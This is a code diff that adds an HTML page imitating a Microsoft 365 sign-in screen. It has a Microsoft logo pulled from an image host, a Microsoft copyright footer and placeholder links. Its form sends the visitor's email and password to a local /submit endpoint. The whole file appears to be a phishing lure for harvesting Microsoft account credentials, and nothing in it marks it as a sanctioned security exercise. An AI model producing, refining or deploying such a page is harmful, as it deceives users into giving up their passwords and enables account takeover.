@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f6f6f6;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 100px;
+    }
+    .content {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 20px;
+    }
+    .form-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .logo-wrapper {
+      background-color: white;
+      padding: 10px;
+      border-radius: 4px;
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .m365-logo {
+      width: 150px;
+      display: block;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    label {
+      margin-bottom: 5px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .password-container {
+      position: relative;
+    }
+    .password-container button {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #0078d4;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .checkbox-container input {
+      margin-right: 10px;
+    }
+    .sign-in-btn {
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .sign-in-btn:hover {
+      background-color: #005a9e;
+    }
+    .additional-links {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+    .additional-links a {
+      color: #0078d4;
+      text-decoration: none;
+      margin-bottom: 10px;
+    }
+    footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+    footer a {
+      color: #0078d4;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="content">
+      <div class="form-container">
+        <div class="logo-wrapper">
+          <img src="https://i.imgur.com/3H8PbzI.png" alt="Microsoft 365 Logo" class="m365-logo">
+        </div>
+        <form action="/submit" method="POST">
+          <label for="email">Email *</label>
+          <input type="email" id="email" name="email" required />
+          <label for="password">Password *</label>
+          <div class="password-container">
+            <input type="password" id="password" name="password" required />
+            <button type="button" id="show-password">Show</button>
+          </div>
+          <div class="checkbox-container">
+            <input type="checkbox" id="keep-signed-in" name="keep-signed-in" />
+            <label for="keep-signed-in">Keep me signed in on this device</label>
+          </div>
+          <button type="submit" class="sign-in-btn">Sign In</button>
+          <div class="additional-links">
+            <a href="#">Need to find your password?</a>
+            <a href="#">Don't have an account? Get Started</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <footer>
+      <p>
+        Copyright © 2025 Microsoft Corporation.
+        All Rights Reserved.
+        <a href="#">Privacy Policy</a> |
+        <a href="#">Terms of Use</a>
+      </p>
+    </footer>
+  </div>
+  <script>
+    document.getElementById('show-password').addEventListener('click', function () {
+      var passwordField = document.getElementById('password');
+      var type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordField.setAttribute('type', type);
+      this.textContent = type === 'password' ? 'Show' : 'Hide';
+    });
+  </script>
+</body>
+</html>
